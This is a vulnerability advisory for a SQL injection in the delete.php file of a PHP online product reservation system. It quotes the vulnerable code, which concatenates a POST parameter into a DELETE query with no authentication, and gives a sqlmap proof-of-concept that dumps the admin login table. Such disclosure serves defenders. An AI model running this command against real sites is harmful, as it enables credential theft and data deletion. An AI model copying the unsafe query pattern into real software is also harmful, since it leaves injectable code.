# SQL Injection Vulnerability in delete.php (Product Deletion)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)
**Download Link**: https://code-projects.org/online-product-reservation-system-in-php-with-source-code/

**Vulnerable File**: handgunner-administrator/delete.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the product deletion functionality. The application directly concatenates user input into a DELETE query without validation or authentication, allowing attackers to extract database data and delete arbitrary records.

### Analyse

**Vulnerability: SQL Injection in DELETE Query**

```php
include('../config/config.php');

// Line 12: User input directly from POST without validation
$id = $_POST['id'];

// Line 16: Direct concatenation into DELETE query - VULNERABLE!
mysql_query("DELETE FROM products WHERE id = '$id'") or die(mysql_error());

/* 	header("Location: view_prod.php");  */
```

**Vulnerability Analysis**:

1. **SQL Injection**: Direct concatenation of `id` parameter into DELETE query
2. **No Authentication**: File can be accessed without login
3. **No Authorization**: No check if user has permission to delete
4. **No Input Validation**: ID is not validated as integer

### POC

```bash
sqlmap -u "http://localhost:8081/handgunner-administrator/delete.php" \
  --data="id=1" \
  --method=POST \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump

```

[![pZUIPZq.png](https://s41.ax1x.com/2026/01/03/pZUIPZq.png)](https://imgchr.com/i/pZUIPZq)

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
